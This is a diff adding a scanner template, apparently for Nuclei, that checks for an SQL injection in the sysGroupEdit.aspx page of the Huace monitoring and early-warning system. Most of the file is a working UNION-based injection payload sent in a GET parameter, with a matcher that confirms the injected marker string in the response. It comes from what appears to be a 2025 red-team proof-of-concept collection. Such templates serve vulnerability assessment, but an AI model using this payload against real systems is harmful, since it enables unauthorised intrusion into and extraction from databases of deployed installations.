@@ -1,0 +1,30 @@
+id: huace-sysGroupEdit-sqli
+info:
+  name: 华测监测预警系统 sysGroupEdit.aspx SQL注入
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/crushforyou/2025hvv-poc/blob/main/%E5%8D%8E%E6%B5%8B%E7%9B%91%E6%B5%8B%E9%A2%84%E8%AD%A6%E7%B3%BB%E7%BB%9F/%E5%8D%8E%E6%B5%8B%E7%9B%91%E6%B5%8B%E9%A2%84%E8%AD%A6%E7%B3%BB%E7%BB%9F%20sysGroupEdit.aspx%20SQL%E6%B3%A8%E5%85%A5.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: sqli,huace
+
+http:
+  - raw:
+      - |
+        GET /Web/SysManage/sysGroupEdit.aspx?id=1%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28112%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%2889%29%2BCHAR%28118%29%2BCHAR%2889%29%2BCHAR%2888%29%2BCHAR%28105%29%2BCHAR%28119%29%2BCHAR%2898%29%2BCHAR%28110%29%2BCHAR%2867%29%2BCHAR%28114%29%2BCHAR%28113%29%2BCHAR%2877%29%2BCHAR%2886%29%2BCHAR%2869%29%2BCHAR%28118%29%2BCHAR%2885%29%2BCHAR%28120%29%2BCHAR%28104%29%2BCHAR%28111%29%2BCHAR%2866%29%2BCHAR%2899%29%2BCHAR%2868%29%2BCHAR%2897%29%2BCHAR%2869%29%2BCHAR%28117%29%2BCHAR%2875%29%2BCHAR%2876%29%2BCHAR%28115%29%2BCHAR%2874%29%2BCHAR%2866%29%2BCHAR%2873%29%2BCHAR%2888%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%2877%29%2BCHAR%2876%29%2BCHAR%2880%29%2BCHAR%2898%29%2BCHAR%28119%29%2BCHAR%2889%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28106%29%2BCHAR%28118%29%2BCHAR%28113%29--+wkZw HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'qzpbqYvYXiwbnCrqMVEvUxhoBcDaEuKLsJBIXxqMLPbwYqjjvq')
+        condition: and
